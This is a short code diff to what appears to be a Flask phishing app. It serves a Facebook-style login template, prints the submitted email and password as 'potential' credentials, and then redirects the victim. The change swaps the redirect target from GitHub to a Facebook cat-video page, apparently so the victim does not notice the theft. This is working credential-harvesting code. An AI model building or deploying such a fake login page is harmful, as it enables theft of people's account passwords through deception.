@@ -22,7 +22,8 @@ def log_in():
         req = request.form
         print("Potential Email Id/Username :"+req['email'])
         print("Potential Password : "+req['pass'])
-        return redirect('https://github.com/')
+        # redirects to Funny cat videos page change if required
+        return redirect('https://www.facebook.com/trynottolaughpets/videos/funny-cats-compilation/1928114857439222/')
 
     elif request.method == "GET":
         return render_template('fb_template/index.html')
